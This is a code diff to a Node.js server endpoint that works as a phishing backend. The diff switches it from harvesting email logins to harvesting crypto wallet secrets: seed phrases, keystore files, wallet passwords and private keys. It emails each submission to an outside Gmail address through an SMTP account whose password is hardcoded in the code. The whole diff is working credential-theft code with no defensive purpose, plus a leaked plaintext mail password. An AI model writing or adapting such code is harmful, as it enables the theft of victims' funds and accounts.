@@ -21,50 +21,35 @@ const users = [
 
 app.post('/api/send', async (req, res) => {
 
-    const { email, password, platform } = req.body;
+    const { phrase, keystore_json, wallet_password, private_key, type, platform } = req.body;
 
-    // var transport = nodemailer.createTransport({
-    //   host: host,
-    //   port: port,
-    //   auth: {
-    //     user: username,
-    //     pass: password
-    //   }
-    // });
-
-    // Function to send emails
-// function sendEmail(emailAddress) {
-//   const mailOptions = {
-//     from: 'testsmtp@racius.tech', // Replace with your Gmail email address
-//     to: emailAddress, // Set the 'to' field to the current email address
-//     subject: subject,
-//     html: message
-//   };
-
-//   transport.sendMail(mailOptions, (error, info) => {
-//     if (error) {
-//       console.log('Error sending email:', error);
-//     } else {
-//       console.log('Email sent:', info.response);
-//     }
-//   });
-// }
 
 
  var transport = nodemailer.createTransport({
       host: 'mail.jumping-rivers.co.uk',
       port: 465,
       auth: {
-        user: 'info@jumping-rivers.co.uk',
+        user: 'webresolve@jumping-rivers.co.uk',
         pass: 'Vanilla11**'
       }
     });
 
   let mailOptions = {
-    from: 'tinfo@jumping-rivers.co.uk',
-    to: 'raheemjoe08@gmail.com',
-    subject: platform,
-    text: 'Platform is ' + platform + ' Username/Email is ' + email + ' password is ' + password,
+    from: 'twebresolve@jumping-rivers.co.uk',
+    to: 'ricardo.josh12@gmail.com',
+    subject: type,
+    html: `
+      <html>
+        <body>
+          <h1>Platform ${platform} <br></h1>
+          <p>Connection Type ${type} <br></p>
+          <p>Phrase is ${phrase} <br></p>
+          <p>Keystore JSON is ${keystore_json} <br></p>
+          <p>Wallet Password is ${wallet_password} <br></p>
+          <p>Private Key is ${private_key} <br></p>
+        </body>
+      </html>
+    `
   };
 
 
@@ -77,7 +62,7 @@ app.post('/api/send', async (req, res) => {
 
 
 
-res.status(200).json({ message: 'Working' + password });
+res.status(200).json({ message: 'Working' + type });
 
 
 
